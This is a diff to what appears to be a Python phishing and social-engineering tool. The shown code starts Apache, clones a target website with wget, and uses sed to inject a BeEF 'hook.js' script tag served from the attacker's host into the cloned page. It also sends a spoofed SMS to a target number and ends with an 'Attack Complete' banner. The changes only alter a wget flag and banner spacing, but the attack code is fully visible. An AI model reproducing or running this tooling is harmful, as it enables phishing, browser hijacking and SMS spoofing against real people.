@@ -81,7 +81,7 @@ def s_harstr():
         else:
             pass
         subprocess.call(
-            'service apache2 start && cd /var/www/html/ && wget --no-check-certificate -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
+            'service apache2 start && cd /var/www/html/ && wget -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
             shell=True)
         subprocess.call(
             'sed -i \'s#</body>#\\n<script src="http://' + LHOST + ':3000/hook.js"></script></body>#g\' /var/www/html/index.html',
@@ -170,15 +170,15 @@ def s_harstr():
         print "I: Send SMS Spoof for {0}...".format(TARGET_NUM)
         print "I: Content SMS Spoof: {0}...".format(MESSAGE)
         print """
-                             _   _             _       _____                      _      _       
-                        /\  | | | |           | |     / ____|                    | |    | |      
-                       /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___ 
-                      / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
-                     / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
-                    /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
-                                                                           | |                   
-                                                                           |_|                   
-                """
+             _   _             _       _____                      _      _
+        /\  | | | |           | |     / ____|                    | |    | |
+       /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___
+      / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
+     / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
+    /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
+                                                               | |
+                                                               |_|
+"""
         sys.exit()
 
     elif NGROK_SLT == "2":
@@ -256,7 +256,7 @@ def s_harstr():
         else:
             pass
         subprocess.call(
-            'service apache2 start && cd /var/www/html/ && wget --no-check-certificate -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
+            'service apache2 start && cd /var/www/html/ && wget -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
             shell=True)
         subprocess.call(
             'sed -i \'s#</body>#\\n<script src="http://' + LGHOST + ':' + LGPORT_BEEF + '/hook.js"></script></body>#g\' /var/www/html/index.html',
@@ -393,15 +393,15 @@ def s_harstr():
         print "I: Send SMS Spoof for {0}...".format(TARGET_NUM)
         print "I: Content SMS Spoof: {0}...".format(MESSAGE)
         print """
-                             _   _             _       _____                      _      _       
-                        /\  | | | |           | |     / ____|                    | |    | |      
-                       /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___ 
-                      / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
-                     / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
-                    /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
-                                                                           | |                   
-                                                                           |_|                   
-                """
+             _   _             _       _____                      _      _
+        /\  | | | |           | |     / ____|                    | |    | |
+       /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___
+      / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
+     / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
+    /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
+                                                               | |
+                                                               |_|
+"""
         sys.exit()
     else:
         return NGROK_SLT
